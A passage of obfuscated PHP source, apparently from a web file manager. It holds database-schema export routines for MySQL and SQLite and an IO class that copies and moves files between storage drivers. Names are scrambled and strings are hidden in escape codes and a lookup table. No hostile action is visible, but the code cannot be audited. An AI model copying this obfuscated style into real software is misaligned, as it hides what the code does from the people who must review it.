$²¦ÀÑ±Ò[1133]), $«ãùƒÔ); $ Åññé[] = str_replace($²¦ÀÑ±Ò[58], $²¦ÀÑ±Ò[1134], $«ãùƒÔ); } return $²¦ÀÑ±Ò[58] . implode($²¦ÀÑ±Ò[1135], $ Åññé) . $²¦ÀÑ±Ò[58]; } private function sqlDecode($÷Ğ¬±, $Öî»©©Û, $ùõèÎöÃ = '') { $Û”É†…® =& $_SERVER[çâ¥×ø³]; $÷Ğ¬± = str_replace(array($Û”É†…®[1132], $Û”É†…®[1133]), array($Û”É†…®[1131], $Û”É†…®[246]), $÷Ğ¬±); if ($Öî»©©Û == $Û”É†…®[13]) { return $ùõèÎöÃ != $Û”É†…®[1136] ? stripslashes($÷Ğ¬±) : $÷Ğ¬±; } if ($ùõèÎöÃ == $Û”É†…®[1136]) { $÷Ğ¬± = str_replace($Û”É†…®[1137], $Û”É†…®[118], stripslashes($÷Ğ¬±)); } return $÷Ğ¬±; } public function getSqlFile($ãº†Çê = '') { $ÁÉĞ›°ä =& $_SERVER[çâ¥×ø³]; $½åÑ…œã = $this->dbType(!0); $‘ºï–ÙÚ = CONTROLLER_DIR . "\151\x6e\x73\x74\x61\x6c\x6c\x2f\x64\x61\x74\141\57{$½åÑ…œã}\56\163\x71\154"; $­êø³¯Ï = file_get_contents($‘ºï–ÙÚ); $‡¾¡µÉî = $ÁÉĞ›°ä[1138] . ($½åÑ…œã == $ÁÉĞ›°ä[853] ? $ÁÉĞ›°ä[1139] : $ÁÉĞ›°ä[1140]) . $ÁÉĞ›°ä[1141]; preg_match_all($‡¾¡µÉî, $­êø³¯Ï, $ıÓŠ­²—); $ÆœÁÚËÔ = $ıÓŠ­²—[1]; $ÍÃò°¡Î = $this->model()->db(); $í˜Şë¯ = $ÍÃò°¡Î->getTables(); $²ÖãâíÆ = TEMP_FILES . $ÁÉĞ›°ä[1142] . date($ÁÉĞ›°ä[255]) . $ÁÉĞ›°ä[8]; del_dir($²ÖãâíÆ); mk_dir($²ÖãâíÆ); $—†åı÷¥ = $²ÖãâíÆ . $ÁÉĞ›°ä[1143]; $¯ÈØÛ•ù = $²ÖãâíÆ . $ÁÉĞ›°ä[1144]; $Ì¶™¸¸• = $½åÑ…œã == $ÁÉĞ›°ä[13] ? $ÁÉĞ›°ä[853] : $ÁÉĞ›°ä[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\x74\141\154\x6c\57\144\x61\x74\x61\57{$Ì¶™¸¸•}\x2e\x73\x71\x6c", $²ÖãâíÆ); @touch($²ÖãâíÆ . $½åÑ…œã . $ÁÉĞ›°ä[837]); $à‰ÏæÉ‘ = fopen($—†åı÷¥, $ÁÉĞ›°ä[1119]); $«ôµ¾Ïì = fopen($¯ÈØÛ•ù, $ÁÉĞ›°ä[1119]); if ($½åÑ…œã == $ÁÉĞ›°ä[13]) { $í˜Şë¯ = array_diff($í˜Şë¯, array($ÁÉĞ›°ä[833], $ÁÉĞ›°ä[834])); $ìáÚ¶ú = array($ÁÉĞ›°ä[1145], $ÁÉĞ›°ä[1146], $ÁÉĞ›°ä[1147]); fwrite($«ôµ¾Ïì, implode(PHP_EOL, $ìáÚ¶ú) . PHP_EOL . PHP_EOL); foreach ($í˜Şë¯ as $ÕåÏ”­) { $…éë¸¨¨ = $this->sqlFromSqlite($ÕåÏ”­); if (!$…éë¸¨¨[$ÁÉĞ›°ä[13]]) { continue; } fwrite($«ôµ¾Ïì, $…éë¸¨¨[$ÁÉĞ›°ä[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÕåÏ”­, $ÆœÁÚËÔ)) { fwrite($à‰ÏæÉ‘, $…éë¸¨¨[$ÁÉĞ›°ä[853]] . PHP_EOL . PHP_EOL); } } } else { foreach ($í˜Şë¯ as $ÕåÏ”­) { $…éë¸¨¨ = $this->sqlFromMysql($ÕåÏ”­); if (!$…éë¸¨¨[$ÁÉĞ›°ä[853]]) { continue; } fwrite($à‰ÏæÉ‘, $…éë¸¨¨[$ÁÉĞ›°ä[853]] . PHP_EOL . PHP_EOL); if (!in_array($ÕåÏ”­, $ÆœÁÚËÔ)) { fwrite($«ôµ¾Ïì, $…éë¸¨¨[$ÁÉĞ›°ä[13]] . PHP_EOL . PHP_EOL); } } } fclose($à‰ÏæÉ‘); fclose($«ôµ¾Ïì); $­êø³¯Ï = array($ÁÉĞ›°ä[853] => $—†åı÷¥, $ÁÉĞ›°ä[13] => $¯ÈØÛ•ù); return $ãº†Çê ? $­êø³¯Ï[$ãº†Çê] : $­êø³¯Ï; } public function dbType($Ø×¹Ó¯³ = false) { $Ş¿«†ãõ =& $_SERVER[çâ¥×ø³]; $ÁØÜö¨ = $Ø×¹Ó¯³ ? $GLOBALS[$Ş¿«†ãõ[6]][$Ş¿«†ãõ[21]] : $this->database; $ÁØÜö¨ = array_change_key_case($ÁØÜö¨); $ÙüŸôÕ = $ÁØÜö¨[$Ş¿«†ãõ[1020]]; if ($ÙüŸôÕ == $Ş¿«†ãõ[1017]) { $ØíÙôî = explode($Ş¿«†ãõ[4], $ÁØÜö¨[$Ş¿«†ãõ[1026]]); $ÙüŸôÕ = $ØíÙôî[0]; } $†³ªÛìØ = array($Ş¿«†ãõ[1148] => $Ş¿«†ãõ[13], $Ş¿«†ãõ[965] => $Ş¿«†ãõ[853]); if (isset($†³ªÛìØ[$ÙüŸôÕ])) { $ÙüŸôÕ = $†³ªÛìØ[$ÙüŸôÕ]; } return $ÙüŸôÕ; } public function sqlFromMysql($âœÚ¯›Ó, $á•¸ƒê® = '') { $òÈŒ¾şÅ =& $_SERVER[çâ¥×ø³]; $úÚ¨›ƒ = $this->model()->db(); $—µÈ­È = $úÚ¨›ƒ->query($òÈŒ¾şÅ[1149] . $âœÚ¯›Ó . $òÈŒ¾şÅ[429]); if (!$—µÈ­È || !$—µÈ­È[0]) { return !1; } $ª’é‘óè = _get($—µÈ­È[0], $òÈŒ¾şÅ[1150], $òÈŒ¾şÅ[12]); if (!$ª’é‘óè) { return !1; } $Ë„õŒËà = "\104\x52\x4f\120\x20\124\x41\x42\114\x45\40\111\106\x20\105\130\111\x53\x54\x53\40\x60{$âœÚ¯›Ó}\140\73" . PHP_EOL . $ª’é‘óè . $òÈŒ¾şÅ[71]; if ($á•¸ƒê® && $á•¸ƒê® == $òÈŒ¾şÅ[853]) { return $Ë„õŒËà; } $Şûºİº€ = array_change_key_case($GLOBALS[$òÈŒ¾şÅ[6]][$òÈŒ¾şÅ[21]]); $ù°“„¥å = $Şûºİº€[$òÈŒ¾şÅ[1025]]; $³ÛŠŸİç = $òÈŒ¾şÅ[1151] . $ù°“„¥å . $òÈŒ¾şÅ[1152] . $âœÚ¯›Ó . $òÈŒ¾şÅ[58]; $¡Œµâã = $òÈŒ¾şÅ[1153] . $âœÚ¯›Ó . $òÈŒ¾şÅ[953]; $ÔøòœÌÙ = $úÚ¨›ƒ->query($³ÛŠŸİç); if (empty($ÔøòœÌÙ)) { $ø™ÇÈö = array($òÈŒ¾şÅ[853] => $òÈŒ¾şÅ[12], $òÈŒ¾şÅ[13] => $òÈŒ¾şÅ[12]); return $á•¸ƒê® ? $ø™ÇÈö[$á•¸ƒê®] : $ø™ÇÈö; } $ÆÓ‘—‚ = $úÚ¨›ƒ->query($¡Œµâã); $¶Ã±£¶È = $òÈŒ¾şÅ[12]; $Á’¶ßï« = array(); foreach ($ÆÓ‘—‚ as $ÛâÙ«„) { if (!$¶Ã±£¶È && $ÛâÙ«„[$òÈŒ¾şÅ[1154]] == $òÈŒ¾şÅ[1155]) { $¶Ã±£¶È = $ÛâÙ«„[$òÈŒ¾şÅ[1156]]; } if (isset($Á’¶ßï«[$ÛâÙ«„[$òÈŒ¾şÅ[1154]]])) { $Á’¶ßï«[$ÛâÙ«„[$òÈŒ¾şÅ[1154]]][$òÈŒ¾şÅ[1157]][] = $ÛâÙ«„[$òÈŒ¾şÅ[1156]]; continue; } $Á’¶ßï«[$ÛâÙ«„[$òÈŒ¾şÅ[1154]]] = array($òÈŒ¾şÅ[1158] => $ÛâÙ«„[$òÈŒ¾şÅ[1154]], $òÈŒ¾şÅ[1157] => array($ÛâÙ«„[$òÈŒ¾şÅ[1156]]), $òÈŒ¾şÅ[1159] => $ÛâÙ«„[$òÈŒ¾şÅ[1160]] == $òÈŒ¾şÅ[88] ? 0 : 1); } $¦™ëÑÒ¥ = array(); foreach ($Á’¶ßï« as $ÛâÙ«„) { $õ ÈÅš = $ÛâÙ«„[$òÈŒ¾şÅ[1158]] == $òÈŒ¾şÅ[1155]; $õ˜´ŸÖŠ = array($òÈŒ¾şÅ[1161], $ÛâÙ«„[$òÈŒ¾şÅ[1159]] == $òÈŒ¾şÅ[88] && !$õ ÈÅš ? $òÈŒ¾şÅ[1162] : $òÈŒ¾şÅ[12], $òÈŒ¾şÅ[1163], $òÈŒ¾şÅ[1164] . $âœÚ¯›Ó . $òÈŒ¾şÅ[11] . ($õ ÈÅš ? $òÈŒ¾şÅ[1165] : $ÛâÙ«„[$òÈŒ¾şÅ[1158]]) . $òÈŒ¾şÅ[118], $òÈŒ¾şÅ[1166], $òÈŒ¾şÅ[118] . $âœÚ¯›Ó . $òÈŒ¾şÅ[118], $òÈŒ¾şÅ[1167] . implode($òÈŒ¾şÅ[1168], $ÛâÙ«„[$òÈŒ¾şÅ[1157]]) . $òÈŒ¾şÅ[1169]); $¦™ëÑÒ¥[] = implode($òÈŒ¾şÅ[53], $õ˜´ŸÖŠ) . $òÈŒ¾şÅ[71]; } $ò†ªßïò = array(); $ó´€™Æú = array($òÈŒ¾şÅ[1170] => $òÈŒ¾şÅ[1171], $òÈŒ¾şÅ[1171] => $òÈŒ¾şÅ[1171], $òÈŒ¾şÅ[332] => $òÈŒ¾şÅ[359], $òÈŒ¾şÅ[331] => $òÈŒ¾şÅ[359]); foreach ($ÔøòœÌÙ as $ÛâÙ«„) { $õ˜´ŸÖŠ = array($òÈŒ¾şÅ[118] . $ÛâÙ«„[$òÈŒ¾şÅ[1172]] . $òÈŒ¾şÅ[118], isset($ó´€™Æú[$ÛâÙ«„[$òÈŒ¾şÅ[1173]]]) ? $ó´€™Æú[$ÛâÙ«„[$òÈŒ¾şÅ[1173]]] : $ÛâÙ«„[$òÈŒ¾şÅ[1174]], $ÛâÙ«„[$òÈŒ¾şÅ[1175]] == $òÈŒ¾şÅ[951] ? $òÈŒ¾şÅ[1176] : $òÈŒ¾şÅ[1177], $ÛâÙ«„[$òÈŒ¾şÅ[1172]] == $¶Ã±£¶È ? $òÈŒ¾şÅ[1178] : $òÈŒ¾şÅ[12], $ÛâÙ«„[$òÈŒ¾şÅ[1002]] ? strtoupper(str_replace($òÈŒ¾şÅ[11], $òÈŒ¾şÅ[12], $ÛâÙ«„[$òÈŒ¾şÅ[1002]])) : $òÈŒ¾şÅ[12]); $ò†ªßïò[] = trim(implode($òÈŒ¾şÅ[53], $õ˜´ŸÖŠ)); } $…·ç¯« = array($òÈŒ¾şÅ[1179] . $âœÚ¯›Ó . $òÈŒ¾şÅ[1180], $òÈŒ¾şÅ[1181] . $âœÚ¯›Ó . $òÈŒ¾şÅ[1182], implode($òÈŒ¾şÅ[50] . PHP_EOL, $ò†ªßïò), $òÈŒ¾şÅ[999]); $¨ª˜Æñì = implode(PHP_EOL, array_merge($…·ç¯«, $¦™ëÑÒ¥)); if ($á•¸ƒê® && $á•¸ƒê® == $òÈŒ¾şÅ[13]) { return $¨ª˜Æñì; } $ø™ÇÈö = array($òÈŒ¾şÅ[853] => $Ë„õŒËà, $òÈŒ¾şÅ[13] => $¨ª˜Æñì); return $á•¸ƒê® ? $ø™ÇÈö[$á•¸ƒê®] : $ø™ÇÈö; } public function sqlFromSqlite($„“È ”ğ, $ÚÚŒÀÖÛ = '') { $Çì¤‘Ãƒ =& $_SERVER[çâ¥×ø³]; $áÙÂ¶Œ = $this->model()->db(); $Ÿ°ıÇÏ = "\x50\x52\101\107\x4d\101\x20\x54\101\x42\x4c\105\x5f\x49\116\106\x4f\x20\50\47{$„“È ”ğ}\47\x29"; $åÜı«éæ = "\123\x45\114\105\x43\x54\40\52\x20\x46\122\x4f\115\x20\x73\161\154\x69\164\x65\x5f\155\x61\163\164\x65\x72\x20\x57\x48\x45\x52\105\x20\164\142\x6c\x5f\156\x61\x6d\145\x20\x3d\40\47{$„“È ”ğ}\x27"; $ÔıÏÙ»ø = $áÙÂ¶Œ->query($Ÿ°ıÇÏ); if (empty($ÔıÏÙ»ø)) { $ÍÙ˜­õ« = array($Çì¤‘Ãƒ[853] => $Çì¤‘Ãƒ[12], $Çì¤‘Ãƒ[13] => $Çì¤‘Ãƒ[12]); return $ÚÚŒÀÖÛ ? $ÍÙ˜­õ«[$ÚÚŒÀÖÛ] : $ÍÙ˜­õ«; } $¦…·êËÎ = $áÙÂ¶Œ->query($åÜı«éæ); $ôê¥’ÊÀ = $íÔ‘øÕÏ = array(); foreach ($¦…·êËÎ as $ŠÏ£Ò÷†) { if ($ŠÏ£Ò÷†[$Çì¤‘Ãƒ[33]] == $Çì¤‘Ãƒ[323]) { $ôê¥’ÊÀ[] = $ŠÏ£Ò÷†[$Çì¤‘Ãƒ[1183]]; } else { $íÔ‘øÕÏ[$ŠÏ£Ò÷†[$Çì¤‘Ãƒ[32]]] = $ŠÏ£Ò÷†[$Çì¤‘Ãƒ[1183]]; } } $¥“±ÑÉ† = array_merge(array($Çì¤‘Ãƒ[1179] . $„“È ”ğ . $Çì¤‘Ãƒ[118]), $ôê¥’ÊÀ, array_values($íÔ‘øÕÏ)); $¥“±ÑÉ† = implode($Çì¤‘Ãƒ[71] . PHP_EOL, $¥“±ÑÉ†) . $Çì¤‘Ãƒ[71]; if ($ÚÚŒÀÖÛ && $ÚÚŒÀÖÛ == $Çì¤‘Ãƒ[13]) { return $¥“±ÑÉ†; } $ßÓ°ñ€ö = array(); $Î¥çºŒô = array($Çì¤‘Ãƒ[1171] => $Çì¤‘Ãƒ[1184], $Çì¤‘Ãƒ[359] => $Çì¤‘Ãƒ[1185]); $±˜šûêô = $Çì¤‘Ãƒ[12]; foreach ($ÔıÏÙ»ø as $ŠÏ£Ò÷†) { if ($ŠÏ£Ò÷†[$Çì¤‘Ãƒ[57]] == $Çì¤‘Ãƒ[88]) { $±˜šûêô = $ŠÏ£Ò÷†[$Çì¤‘Ãƒ[32]]; } $¡³‡–ÒÈ = array($Çì¤‘Ãƒ[429] . $ŠÏ£Ò÷†[$Çì¤‘Ãƒ[32]] . $Çì¤‘Ãƒ[429], isset($Î¥çºŒô[$ŠÏ£Ò÷†[$Çì¤‘Ãƒ[33]]]) ? $Î¥çºŒô[$ŠÏ£Ò÷†[$Çì¤‘Ãƒ[33]]] : $ŠÏ£Ò÷†[$Çì¤‘Ãƒ[33]], $ŠÏ£Ò÷†[$Çì¤‘Ãƒ[35]] == $Çì¤‘Ãƒ[88] ? $Çì¤‘Ãƒ[1176] : $Çì¤‘Ãƒ[1186] . $ŠÏ£Ò÷†[$Çì¤‘Ãƒ[56]], $ŠÏ£Ò÷†[$Çì¤‘Ãƒ[57]] == $Çì¤‘Ãƒ[88] ? $Çì¤‘Ãƒ[1187] : $Çì¤‘Ãƒ[12]); $ßÓ°ñ€ö[] = trim(implode($Çì¤‘Ãƒ[53], $¡³‡–ÒÈ)); } foreach ($íÔ‘øÕÏ as $¸—÷ï˜ => $½ãŒÒ­«) { $“â°ÓÚ‡ = str_replace($Çì¤‘Ãƒ[1188] . $„“È ”ğ . $Çì¤‘Ãƒ[11], $Çì¤‘Ãƒ[12], $¸—÷ï˜); $‘‚Ÿî£ = str_replace(array($Çì¤‘Ãƒ[118], $Çì¤‘Ãƒ[1010]), $Çì¤‘Ãƒ[429], substr($½ãŒÒ­«, stripos($½ãŒÒ­«, $Çì¤‘Ãƒ[304]))); if ($“â°ÓÚ‡ == $Çì¤‘Ãƒ[1165]) { $ËÄ˜» = $Çì¤‘Ãƒ[1189] . $±˜šûêô . $Çì¤‘Ãƒ[1190]; } else { $ËÄ˜» = (stripos($“â°ÓÚ‡, $Çì¤‘Ãƒ[11]) ? $Çì¤‘Ãƒ[1191] : $Çì¤‘Ãƒ[12]) . ($Çì¤‘Ãƒ[1192] . $“â°ÓÚ‡ . $Çì¤‘Ãƒ[1193] . $‘‚Ÿî£); } $ßÓ°ñ€ö[] = $ËÄ˜»; } $¤Ÿ¢Õªû = array($Çì¤‘Ãƒ[1194] . $„“È ”ğ . $Çì¤‘Ãƒ[1195], $Çì¤‘Ãƒ[1196] . $„“È ”ğ . $Çì¤‘Ãƒ[1197], implode($Çì¤‘Ãƒ[50] . PHP_EOL, $ßÓ°ñ€ö), $Çì¤‘Ãƒ[1198]); $Øòûñó¾ = implode(PHP_EOL, $¤Ÿ¢Õªû); if ($ÚÚŒÀÖÛ && $ÚÚŒÀÖÛ == $Çì¤‘Ãƒ[853]) { return $Øòûñó¾; } $ÍÙ˜­õ« = array($Çì¤‘Ãƒ[853] => $Øòûñó¾, $Çì¤‘Ãƒ[13] => $¥“±ÑÉ†); return $ÚÚŒÀÖÛ ? $ÍÙ˜­õ«[$ÚÚŒÀÖÛ] : $ÍÙ˜­õ«; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ûñà•£, $†ÔõĞ†ä) { $­Äœ¹´ =& $_SERVER[çâ¥×ø³]; $˜ùşäß´ = $†ÔõĞ†ä; $GLOBALS[$­Äœ¹´[1199]] = $­Äœ¹´[1200] . $Ûñà•£; Hook::trigger($­Äœ¹´[1200] . $Ûñà•£ . $­Äœ¹´[1201], $˜ùşäß´); $íëôÂÔù = self::driverMake($†ÔõĞ†ä[0]); if (!$íëôÂÔù) { return !1; } if (method_exists($íëôÂÔù, $Ûñà•£)) { $¹Øç‰’» = @call_user_func_array(array($íëôÂÔù, $Ûñà•£), $†ÔõĞ†ä); } else { if (method_exists($íëôÂÔù, $­Äœ¹´[1202])) { $¹Øç‰’» = @call_user_func_array(array($íëôÂÔù, $Ûñà•£), $†ÔõĞ†ä); } else { if (method_exists(self, $Ûñà•£)) { $¹Øç‰’» = @call_user_func_array(array(self, $Ûñà•£), $†ÔõĞ†ä); } else { $¹Øç‰’» = call_user_func_array(array(parent, $Ûñà•£), $†ÔõĞ†ä); } } } Hook::trigger($­Äœ¹´[1200] . $Ûñà•£ . $­Äœ¹´[1203], $˜ùşäß´, $¹Øç‰’»); return $¹Øç‰’»; } public static function init($³¼Á™ä´) { return self::driverMake($³¼Á™ä´); } public static function copy($ûí»İ´, $ÁêšÆ‡Ğ, $îÏÂ¢• = false, $ÎÄ½€õà = false) { return self::copyMoveStart($ûí»İ´, $ÁêšÆ‡Ğ, $îÏÂ¢•, $_SERVER[çâ¥×ø³][586], $ÎÄ½€õà); } public static function move($ºØ‚§–‹, $ƒ§™¡ãê, $Ã¹ÎØ¾­ = false, $ïÇşŞúø = false) { return self::copyMoveStart($ºØ‚§–‹, $ƒ§™¡ãê, $Ã¹ÎØ¾­, $_SERVER[çâ¥×ø³][588], $ïÇşŞúø); } private static function copyMoveStart($ Ÿ–âùÊ, $‹Şêşçî, $¡ğÆÑ†ƒ, $£·££•¶, $ÒëÓÅ›†) { $‰ÜŸÙ¹€ =& $_SERVER[çâ¥×ø³]; $¹ïßã¾ = array($ Ÿ–âùÊ, $‹Şêşçî, $¡ğÆÑ†ƒ, $ÒëÓÅ›†); Hook::trigger($‰ÜŸÙ¹€[1200] . $£·££•¶ . $‰ÜŸÙ¹€[1201], $¹ïßã¾); $Í«¡ÙÁ… = self::copyMove($ Ÿ–âùÊ, $‹Şêşçî, $¡ğÆÑ†ƒ, $£·££•¶, $ÒëÓÅ›†); Hook::trigger($‰ÜŸÙ¹€[1200] . $£·££•¶ . $‰ÜŸÙ¹€[1203], $¹ïßã¾, $Í«¡ÙÁ…); return $Í«¡ÙÁ…; } public static function saveFile($Ş×ú˜Ë¢, $’ôï’¹, $ëßÓú­¶ = true) { $¬±’ˆØä =& $_SERVER[çâ¥×ø³]; $˜Íã‡’µ = self::info($’ôï’¹); $İ˜üÅ‘Ù = self::driverMake($Ş×ú˜Ë¢); $ÒÒª¬ = self::driverMake($’ôï’¹); $ÎÁáå„ = !1; if ($ÒÒª¬->pathParse[$¬±’ˆØä[1204]]) { $ÎÁáå„ = $ÒÒª¬; $ ëÊ¸ØÁ = $ÒÒª¬->pathParse[$¬±’ˆØä[1204]]; $ÒÒª¬ = self::driverMake($ ëÊ¸ØÁ); } if ($İ˜üÅ‘Ù->pathParse[$¬±’ˆØä[1204]]) { $¯œëá´Í = $İ˜üÅ‘Ù->pathParse[$¬±’ˆØä[1204]]; $İ˜üÅ‘Ù = self::driverMake($¯œëá´Í); } $–‹‹¬ = $ÒÒª¬->pathFather($’ôï’¹); $¡ù£…í = !0; if (!$ëßÓú­¶ && self::driverIsSame($İ˜üÅ‘Ù, $ÒÒª¬)) { $¡ù£…í = !1; } $Ëº§‚ÁÏ = self::copyFile($İ˜üÅ‘Ù, $Ş×ú˜Ë¢, $ÒÒª¬, $–‹‹¬, $˜Íã‡’µ[$¬±’ˆØä[32]], $¡ù£…í); if ($ÎÁáå„) { $Ëº§‚ÁÏ = $ÎÁáå„->getPathOuter($Ëº§‚ÁÏ); } return $Ëº§‚ÁÏ; } private static function copyMove($çÀĞ‘Şë, $çßâêú, $­úøÑó‘, $ø¦™¢ññ, $ë°Ÿ‡Ÿû = false) { $ù„“€Ûò =& $_SERVER[çâ¥×ø³]; if (!$çÀĞ‘Şë || $çÀĞ‘Şë == $ù„“€Ûò[8] || !$çßâêú) { return !1; } ignore_timeout(); $„ÎµÕÌ = self::driverMake($çÀĞ‘Şë); $¿¢„ÒÜµ = self::driverMake($çßâêú); $çê×¢Õß = $ø¦™¢ññ == $ù„“€Ûò[588]; $öì‚­“« = !1; if ($¿¢„ÒÜµ->pathParse[$ù„“€Ûò[1204]]) { $öì‚­“« = $¿¢„ÒÜµ; $çßâêú = $¿¢„ÒÜµ->pathParse[$ù„“€Ûò[1204]]; $¿¢„ÒÜµ = self::driverMake($çßâêú); } if ($„ÎµÕÌ->pathParse[$ù„“€Ûò[1204]]) { $çÀĞ‘Şë = $„ÎµÕÌ->pathParse[$ù„“€Ûò[1204]]; $„ÎµÕÌ = self::driverMake($çÀĞ‘Şë); } self::check($„ÎµÕÌ, $çÀĞ‘Şë, $¿¢„ÒÜµ, $çßâêú); Hook::trigger($ù„“€Ûò[1205], $„ÎµÕÌ, $çÀĞ‘Şë, $¿¢„ÒÜµ, $çßâêú); $ß›ÂğøĞ = self::driverIsSame($„ÎµÕÌ, $¿¢„ÒÜµ); if ($ß›ÂğøĞ) { if ($ø¦™¢ññ == $ù„“€Ûò[588] && !method_exists($¿¢„ÒÜµ, $ù„“€Ûò[1206]) && trim($çßâêú, $ù„“€Ûò[8]) == trim($¿¢„ÒÜµ->pathFather($çÀĞ‘Şë), $ù„“€Ûò[8])) { if ($„ÎµÕÌ->pathThis($çÀĞ‘Şë) != $ë°Ÿ‡Ÿû && !$„ÎµÕÌ->isTypeObject()) { return $„ÎµÕÌ->rename($çÀĞ‘Şë, $ë°Ÿ‡Ÿû); } return $¿¢„ÒÜµ->getPathOuter($çÀĞ‘Şë); } if (method_exists($¿¢„ÒÜµ, $ø¦™¢ññ)) { return $¿¢„ÒÜµ->{$ø¦™¢ññ}($çÀĞ‘Şë, $çßâêú, $­úøÑó‘, $ë°Ÿ‡Ÿû); } } if ($ß›ÂğøĞ && $ø¦™¢ññ == $ù„“€Ûò[588] && $¿¢„ÒÜµ->getType() == $ù„“€Ûò[106]) { $ËÊ´ê­… = $¿¢„ÒÜµ->movePath($çÀĞ‘Şë, $çßâêú, $ë°Ÿ‡Ÿû); if ($ËÊ´ê­…) { return $ËÊ´ê­…; } } $À”Íâ = $„ÎµÕÌ->isFile($çÀĞ‘Şë); if (!$À”Íâ && $¿¢„ÒÜµ->getType() == $ù„“€Ûò[806] && $„ÎµÕÌ->getType() == $ù„“€Ûò[106]) { $ËÊ´ê­… = $¿¢„ÒÜµ->copyFolderFromIO($„ÎµÕÌ, $çÀĞ‘Şë, $çßâêú, $­úøÑó‘, $çê×¢Õß, $ë°Ÿ‡Ÿû); } else { $ËÊ´ê­… = self::copyPath($„ÎµÕÌ, $çÀĞ‘Şë, $¿¢„ÒÜµ, $çßâêú, $­úøÑó‘, $çê×¢Õß, $À”Íâ, $ë°Ÿ‡Ÿû); } if ($ËÊ´ê­… && $çê×¢Õß) { $„ÎµÕÌ->remove($çÀĞ‘Şë); } if ($öì‚­“«) { $ËÊ´ê­… = $öì‚­“«->getPathOuter($ËÊ´ê­…); } return $ËÊ´ê­…; } private static function check($Äı§¬•Œ, $ŠäÈáŒœ, $äéÍ©Ú«, &$¨¬ëáş) { $’í—ÂØ =& $_SERVER[çâ¥×ø³]; if (self::driverIsSame($Äı§¬•Œ, $äéÍ©Ú«) && $Äı§¬•Œ->isFolder($ŠäÈáŒœ) && $Äı§¬•Œ->isParentOf($ŠäÈáŒœ, $¨¬ëáş)) { show_json(LNG($’í—ÂØ[1207]), !1); } if (!$Äı§¬•Œ->exist($ŠäÈáŒœ)) { show_json(LNG($’í—ÂØ[105]), !1); } } private static function copyPath($¶×É·¯à, $åÖúÊùÓ, $¨‰“ıõá, $Ç‡Î¨š, $€³çÇÛ, $˜íÆƒË¹, $§•Ã…Œ•, $‰Óğ½‡á = false, $ò›™ëĞÄ = true) { $¬†¼­Ò– =& $_SERVER[çâ¥×ø³]; $–Æ®õÙ = empty($‰Óğ½‡á) && $‰Óğ½‡á !== $¬†¼­Ò–[212] ? $¶×É·¯à->pathThis($åÖúÊùÓ) : $‰Óğ½‡á; if ($€³çÇÛ) { $‡»ÍäÉû = $¨‰“ıõá->fileNameExist($Ç‡Î¨š, $–Æ®õÙ); $ÑÂ“•È§ = $–Æ®õÙ; $–Æ®õÙ = $¨‰“ıõá->fileNameAuto($Ç‡Î¨š, $–Æ®õÙ, $€³çÇÛ, !$§•Ã…Œ•); if (!$‡»ÍäÉû || $ÑÂ“•È§ != $–Æ®õÙ) { $€³çÇÛ = !1; } if ($ò›™ëĞÄ && !$€³çÇÛ) { $¨‰“ıõá->_data[$¬†¼­Ò–[1208]] = !0; } } if ($§•Ã…Œ•) { return self::copyFile($¶×É·¯à, $åÖúÊùÓ, $¨‰“ıõá, $Ç‡Î¨š, $–Æ®õÙ, $˜íÆƒË¹); } if ($€³çÇÛ == REPEAT_RENAME_FOLDER) { $€³çÇÛ = !1; } $Àòú«–¶ = rtrim($Ç‡Î¨š, $¬†¼­Ò–[8]) . $¬†¼­Ò–[8] . $–Æ®õÙ; $ÅÀ¿”ÀÑ = $¨‰“ıõá->mkdir($¨‰“ıõá->getPath($Àòú«–¶), $€³çÇÛ); $Ç‡Î¨š = $¨‰“ıõá->getPathInner($ÅÀ¿”ÀÑ); $ÊŞöÔ³À = $¶×É·¯à->listPath($åÖúÊùÓ, !0); $ÊŞöÔ³À = is_array($ÊŞöÔ³À) ? $ÊŞöÔ³À : array($¬†¼­Ò–[83] => array(), $¬†¼­Ò–[82] => array()); $ò³ÈØµ› = array_merge($ÊŞöÔ³À[$¬†¼­Ò–[83]], $ÊŞöÔ³À[$¬†¼­Ò–[82]]); foreach ($ò³ÈØµ› as $ÎÇóÌùÎ) { $õ¢ò¦Ö = $ÎÇóÌùÎ[$¬†¼­Ò–[33]] == $¬†¼­Ò–[214]; $åÖúÊùÓ = $¶×É·¯à->getPathInner($ÎÇóÌùÎ[$¬†¼­Ò–[84]]); $ªÌşë÷ = self::copyPath($¶×É·¯à, $åÖúÊùÓ, $¨‰“ıõá, $Ç‡Î¨š, $€³çÇÛ, $˜íÆƒË¹, $õ¢ò¦Ö, !1, !1); if (!$ªÌşë÷) { IO::errorTips($¬†¼­Ò–[1209] . $åÖúÊùÓ . $¬†¼­Ò–[70] . $Ç‡Î¨š); } } self::copyMoveKeepInfo($¶×É·¯à, $åÖúÊùÓ, $ÅÀ¿”ÀÑ); return $ÅÀ¿”ÀÑ; } private static function copyFile($¡­ÏÔúˆ, $âÂ¦°ö, $ï§ÂÇŒŸ, $ğÉ›¨’—, $Á™Ú©¤, $¶ìÆæ¯â) { $õÆæÒï =& $_SERVER[çâ¥×ø³]; $ğÉ›¨’— = $ï§ÂÇŒŸ->getPath(rtrim($ğÉ›¨’—, $õÆæÒï[8]) . $õÆæÒï[8] . $Á™Ú©¤); $©µÔ²Òè = $õÆæÒï[1210] . time() . rand_string(5); Hook::trigger($õÆæÒï[1211], $¡­ÏÔúˆ, $âÂ¦°ö, $ï§ÂÇŒŸ, $ğÉ›¨’—, $Á™Ú©¤, $©µÔ²Òè); if (self::driverIsSame($¡­ÏÔúˆ, $ï§ÂÇŒŸ)) { if ($¶ìÆæ¯â) { $×ÁÏôš‚ = $ï§ÂÇŒŸ->moveFile($âÂ¦°ö, $ğÉ›¨’—); } else { $×ÁÏôš‚ = $ï§ÂÇŒŸ->copyFile($âÂ¦°ö, $ğÉ›¨’—); } Hook::trigger($õÆæÒï[1212], $¡­ÏÔúˆ, $âÂ¦°ö, $ï§ÂÇŒŸ, $ğÉ›¨’—, $Á™Ú©¤, $×ÁÏôš‚); self::copyMoveKeepInfo($¡­ÏÔúˆ, $âÂ¦°ö, $×ÁÏôš‚); return $×ÁÏôš‚; } $Ş‰€”¦ = TEMP_FILES; if ($GLOBALS[$õÆæÒï[6]][$õÆæÒï[89]][$õÆæÒï[845]]) { $Ş‰€”¦ = $GLOBALS[$õÆæÒï[6]][$õÆæÒï[89]][$õÆæÒï[845]]; } $€Ô£úÕí = $Ş‰€”¦; mk_dir($€Ô£úÕí); $Ç‡½«ê¸ = $€Ô£úÕí . 